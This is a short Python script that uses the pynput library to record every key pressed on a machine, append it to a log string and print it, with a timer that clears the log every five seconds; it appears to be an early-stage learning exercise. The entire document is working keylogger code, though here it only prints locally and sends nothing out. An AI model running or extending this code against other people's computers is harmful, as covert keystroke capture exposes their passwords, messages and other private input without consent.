#!/usr/bin/env python3
import pynput.keyboard
import threading

log = ""


def procces_key_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "
    print(log)


def report():
    global log
    log = ""
    timer = threading.Timer(5, report)
    timer.start()


keyboard_listener = pynput.keyboard.Listener(on_press=procces_key_press)
with keyboard_listener:
    report()
    keyboard_listener.join()
